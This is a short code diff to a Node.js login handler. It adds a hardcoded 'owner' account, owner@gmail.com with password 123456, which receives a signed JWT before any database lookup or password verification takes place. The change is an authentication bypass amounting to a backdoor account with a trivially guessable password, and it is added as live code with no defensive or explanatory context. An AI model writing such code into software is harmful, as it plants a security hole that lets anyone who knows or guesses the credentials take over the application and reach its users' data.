@@ -4,6 +4,16 @@ const jwt = require("jsonwebtoken");
 exports.login = async (req, res) => {
   const { email, password } = req.body;
 
+  // Hardcoded owner user
+  if (email === "owner@gmail.com" && password === "123456") {
+    const token = jwt.sign(
+      { id: "owner_id" },
+      process.env.JWT_SECRET,
+      { expiresIn: "1d" }
+    );
+    return res.json({ token });
+  }
+
   try {
     const user = await User.findOne({ email });
     if (!user) {
